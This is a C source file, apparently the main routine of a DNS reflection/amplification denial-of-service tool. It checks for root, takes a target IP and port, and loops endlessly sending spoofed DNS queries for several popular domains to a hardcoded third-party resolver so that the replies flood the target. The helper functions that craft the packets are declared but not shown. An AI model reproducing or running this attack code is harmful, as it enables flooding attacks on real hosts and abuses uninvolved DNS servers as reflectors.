#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/time.h>
#include <time.h>

void usage(char *str);
void error(char *str);
void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, int dns_p,
	unsigned char *dns_record);

int main(int argc, char **argv)
{	
	// Initial uid check and argument count check
	if(getuid()!=0)
		error("You must be running as root!");
	if(argc<3)
		usage(argv[0]);
	
	// Assignments to variables from the given arguments
	char *trgt_ip = argv[1];
	int trgt_p = atoi(argv[2]);
	
	// This code is just an example if you want to use a list of records 
	// to resolve for the attack, or use a list of different DNS servers, etc
	//while(1)
		//dns_send(trgt_ip, trgt_p, dns_srv, 53, dns_rcrd);
	while(1) {
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.google.com");
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ietf.org");
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.amazon.com");
		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ieee.org");
	}	
	return 0;
}

void usage(char *str)
{
	printf("%s\n target port\n", str);
	exit(0);
}
